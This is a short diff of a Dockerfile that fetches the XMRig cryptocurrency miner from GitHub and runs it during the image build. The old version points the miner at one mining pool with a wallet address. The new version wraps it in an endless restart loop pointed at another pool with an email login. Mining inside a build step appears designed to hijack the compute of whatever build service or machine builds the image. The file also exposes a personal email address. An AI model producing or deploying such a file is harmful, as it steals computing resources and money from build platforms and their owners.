@@ -1,3 +1,3 @@
-FROM ubuntu:18.10
+FROM ubuntu:xenial
 RUN apt-get update && apt-get install -y wget
-RUN wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p Nvidia3 --threads 2 --max-cpu-usage=70 --cpu-priority 3 --donate-level 1
+RUN wget https://github.com/xmrig/xmrig/releases/download/v2.11.0/xmrig-2.11.0-xenial-x64.tar.gz && tar -xf xmrig-2.11.0-xenial-x64.tar.gz && cd xmrig-2.11.0 && while true; do ./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u empireofbooks@gmail.com -p x --threads 2 --max-cpu-usage=80 --cpu-priority 3 --donate-level 1 ; sleep 1; done
